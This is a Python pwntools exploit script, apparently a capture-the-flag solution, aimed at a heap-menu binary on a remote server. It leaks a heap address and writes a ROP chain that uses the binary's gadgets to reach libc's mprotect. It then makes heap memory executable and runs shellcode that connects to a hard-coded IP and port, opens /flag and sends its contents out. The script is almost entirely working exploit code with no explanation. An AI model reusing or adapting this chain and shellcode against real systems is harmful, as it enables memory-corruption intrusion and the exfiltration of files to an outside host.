from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("../src/test")
s=remote("8.130.35.16",58000)
libc=ELF("../dist/libc.so.6")

def menu(ch):
    s.sendlineafter(b"choice: ",str(ch).encode())

def add():
    menu(1)

def edit(idx,offset,data):
    menu(2)
    s.sendlineafter(b"idx: ",str(idx).encode())
    s.sendlineafter(b"offset: ",str(offset).encode())
    s.sendlineafter(b"data: ",data)

def show(idx):
    menu(3)
    s.sendlineafter(b"read?\n",str(idx).encode())
    s.recvuntil(b"Data: ")
    return s.recvline()[:-1]

def delete(idx):
    menu(4)
    s.sendlineafter(b"destroy?\n",str(idx).encode())

if __name__=="__main__":
    stdout=0x406040
    stdin=0x406050
    stderr=0x4061A0
    rsp_rbp=0x40284e
    rbp=rsp_rbp+1
    ret=rbp+1
    # mov rax, [rbp-0x18];mov rax, [rax];add rsp,0x10; pop rbx; pop r12; pop rbp; ret;
    reveal_ptr=0x402FEC
    # mov rdx, rax; mov rax, [rbp-8], mov [rax], rdx; leave; ret;
    aaw=0x402F90
    # mov rax, [rbp-0x18]; mov rdx, [rax]; mov eax, [rbp-0x1c]; add rax, rdx; add rsp, 0x10; pop rbx; pop r12; pop rbp; ret;
    push_rax=0x403040
    # add dword ptr [rbp-0x3d], ebx; nop; ret;
    magic=0x4022dc
    # sub rax, qword ptr [rbp - 0x10] ; pop rbp; ret;
    sub_rax=0x4030B1
    # call rax;
    call_rax=0x402010
    # jmp rax
    jmp_rax=0x40226c
    # pop rbx ; pop r12 ; pop rbp ; ret
    rbx_r12_rbp=0x000000000040284c

    rax=0x3f117
    rdi=0x27765
    rsi=0x28f19
    rdx=0x00000000000fdcfd
    syscall=0x86002
    mprotect=0x101760
    #pause()
    add()
    delete(0)
    add()
    add()
    add()
    add()
    add()
    rop_start=(u64(show(0).ljust(8,b"\x00"))<<12)+0xec0+0x10
    heap_base=rop_start-(0xbc2ed0-0xbb1000)
    success(hex(rop_start))
    #pause()
    p1 = [
        rbx_r12_rbp,0x100000000-libc.sym._IO_2_1_stdout_+rdi,0,stdout+0x3d,
        magic,
        rbx_r12_rbp,0x100000000-libc.sym._IO_2_1_stdin_+rdx,0,stdin+0x3d,
        magic,
        rbx_r12_rbp,0x100000000-libc.sym._IO_2_1_stderr_+libc.sym.mprotect,0,stderr+0x3d,
        magic,
        rbp,rop_start+0x230+0x10+0x18,
        reveal_ptr,
        ret,ret,ret,ret,rop_start+0x230+0x18+0x18,
        jmp_rax, # pop rdi
        heap_base,
        reveal_ptr,
        ret,ret,ret,ret,rop_start+0x230+0x20+0x18,
        jmp_rax, # pop rdx
        7,
        rbx_r12_rbp,0x100000000-rdi+rsi,0,stdout+0x3d,
        magic,
        rbp,rop_start+0x230+0x10+0x18,
        reveal_ptr,
        ret,ret,ret,ret,rop_start+0x230+0x20+0x18,
        jmp_rax, # pop rsi
        0x20000,
        reveal_ptr,
        ret,ret,ret,ret,ret,
        jmp_rax, # mprotect
        rop_start+0x230*2,
    ]
    
    for i in range(len(p1)):
        off=0
        while (p1[i]>>off*8)&0xff==0:
            off+=1
            if off==8:break
        edit(0,i*8+off,p64(p1[i]>>off*8))
    edit(1,8,b"/flag\0\0\0")
    edit(1,0x10,p64(stdout))
    edit(1,0x18,p64(stdin))
    edit(1,0x20,p64(stderr))
    edit(1,0x30,p16(2))
    edit(1,0x32,p16(0x89c8))
    edit(1,0x34,p32(0x10238208))
    shellcode=asm("push 2;pop rdi;push 1;pop rsi;push rsi;pop rdx;dec rdx;push __NR_socket;pop rax;syscall;")
    shellcode+=asm(f"push rax;pop rdi;push {rop_start+0x230+0x30};pop rsi;push 0x10;pop rdx;push __NR_connect;pop rax;syscall;")
    shellcode+=asm(f"push {rop_start+0x230+8};pop rdi;xor rsi,rsi;push rsi;pop rdx;push __NR_open;pop rax;syscall;")
    shellcode+=asm(f"push rax;pop rdi;push rsp;pop rsi;push rsp;pop rdx;xor rax,rax;syscall;")
    shellcode+=asm(f"xor rdi,rdi;xor rax,rax;inc rax;syscall;")
    edit(2,0,shellcode)
    #pause()
    edit(2,0,b"a"*(0x200+0x20)+p64(rop_start-8)+p64(0x40238d))
    s.interactive()
